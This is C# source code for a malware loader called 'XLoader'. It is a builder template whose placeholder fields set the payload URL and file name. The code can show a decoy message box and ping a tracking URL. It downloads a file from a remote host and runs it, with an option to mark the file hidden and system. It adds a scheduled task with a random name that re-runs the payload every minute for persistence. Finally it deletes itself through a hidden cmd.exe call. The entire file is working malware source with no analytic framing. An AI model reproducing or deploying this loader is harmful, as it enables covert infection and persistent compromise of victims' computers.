using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;


namespace XLoader
{
    class Program
    {
        static void Main(string[] args)
        {

            if ("#message" == "1")
            {
                Message("#title", "#text", "#type");
            }

            if ("#uselogger" == "1")
            {
                Logger("#logger");
            }
            Download("#url", @"#dlpath", "#name");
            if ("#taskshedule"=="1")
            {
                tschedule(Environment.GetEnvironmentVariable("Temp") + "\\#name");
            }

            if ("#deleting" == "1")
            {
                SelfDelete("#delay");
            }

        }

        public static void Message(string title, string text, string type)
        {
            switch (type)
            {
                case ("Error"):
                    MessageBox.Show(text, title, MessageBoxButtons.OK, MessageBoxIcon.Error);
                    break;
                case ("Information"):
                    MessageBox.Show(text, title, MessageBoxButtons.OK, MessageBoxIcon.Information);
                    break;
                case ("Question"):
                    MessageBox.Show(text, title, MessageBoxButtons.OK, MessageBoxIcon.Question);
                    break;
            }
        }

        public static void Logger(string link)
        {
            WebRequest request = WebRequest.Create(link);
            request.Credentials = CredentialCache.DefaultCredentials;
            ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
            request.GetResponse(); 
        }

        public static void Download(string url, string path ,string filename)
        {
            
            filename = path + filename;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            using (var client = new WebClient())
            {
                client.DownloadFile(url, filename);
                if ("#hidden" == "1")
                {
                    File.SetAttributes(filename, FileAttributes.Hidden | FileAttributes.System);
               
                }
                Process.Start(filename);
            }
        }

        public static void SelfDelete(string delay)
        {
            Process.Start(new ProcessStartInfo
            {
                Arguments = "/C choice /C Y /N /D Y /T " + delay + " & Del \"" + new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }


        public static void tschedule(string path)
        {
            var process = new Process();
            process.StartInfo = new ProcessStartInfo("cmd", "/C " + "schtasks /create /tn \\"+generateString()+ "\\" + generateString() + " /tr " + path + " /st 00:00 /du 9999:59 /sc once /ri 1 /f");
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }

        public static String generateString()
        {
            string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
            string result = "";
            Random rnd = new Random();
            int iter = rnd.Next(0, abc.Length);
            for (int i = 0; i < iter; i++)
                result += abc[rnd.Next(0, abc.Length)];

            return result;
        }

    }
}